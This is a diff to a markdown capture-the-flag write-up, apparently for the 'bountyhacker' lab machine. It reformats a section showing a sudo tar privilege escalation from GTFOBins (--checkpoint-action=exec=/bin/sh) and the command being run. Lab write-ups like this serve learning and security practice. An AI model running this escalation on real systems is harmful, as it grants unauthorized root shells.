@@ -78,8 +78,10 @@ User lin may run the following commands on bountyhacker:
     (root) /bin/tar
 ``` 
 <br>
-There is a privesc with it on gtfobins so it's an easy win : <br>
-```sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```
+There is a privesc with it on gtfobins so it's an easy win :
+```sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+<br>
 Let's run it :<br>
 ```lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 tar: Removing leading `/' from member names
